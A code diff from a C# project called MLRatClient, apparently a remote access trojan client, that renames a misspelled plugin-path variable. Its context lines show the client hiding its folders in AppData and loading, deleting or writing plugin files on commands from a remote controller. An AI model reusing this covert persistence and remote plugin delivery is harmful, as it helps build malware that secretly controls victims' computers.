@@ -16,7 +16,7 @@ namespace MLRatClient
         private static eSock.Client networkClient;
         private static Dictionary<Guid, MLClientPlugin> LoadedPlugins = new Dictionary<Guid, MLClientPlugin>();
         private static Dictionary<Guid, FileStream> PluginUpdates = new Dictionary<Guid, FileStream>();
-        private static string PluginBaseLication;
+        private static string PluginBaseLocation;
         [STAThread]
         static void Main(string[] args)
         {
@@ -24,10 +24,10 @@ namespace MLRatClient
             string _ratBase = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 "MLRat");
             CreateHiddentDirectory(_ratBase);
-            PluginBaseLication = Path.Combine(_ratBase, "Plugins");
-            CreateHiddentDirectory(PluginBaseLication);
+            PluginBaseLocation = Path.Combine(_ratBase, "Plugins");
+            CreateHiddentDirectory(PluginBaseLocation);
 
-            DirectoryInfo di = new DirectoryInfo(PluginBaseLication);
+            DirectoryInfo di = new DirectoryInfo(PluginBaseLocation);
             foreach (FileInfo fi in di.GetFiles("*.MLP"))
             {
                 LoadPlugin(fi.FullName);
@@ -206,7 +206,7 @@ namespace MLRatClient
                     {
                         Guid PluginID = (Guid)data[2];
                         Console.WriteLine("Deleting plugin {0}", PluginID.ToString("n"));
-                        File.Delete(Path.Combine(PluginBaseLication, string.Format("{0}.MLP", PluginID.ToString("n"))));
+                        File.Delete(Path.Combine(PluginBaseLocation, string.Format("{0}.MLP", PluginID.ToString("n"))));
                     }
 
                     if (command == NetworkPacket.UpdatePlugin)
@@ -221,7 +221,7 @@ namespace MLRatClient
                             {
                                 FileStream update =
                                     new FileStream(
-                                        Path.Combine(PluginBaseLication,
+                                        Path.Combine(PluginBaseLocation,
                                             string.Format("{0}.MLP", PluginID.ToString("n"))), FileMode.Create);
                                 PluginUpdates[PluginID] = update;
                                 Console.WriteLine("Started update for plugin id {0}", PluginID.ToString("n"));
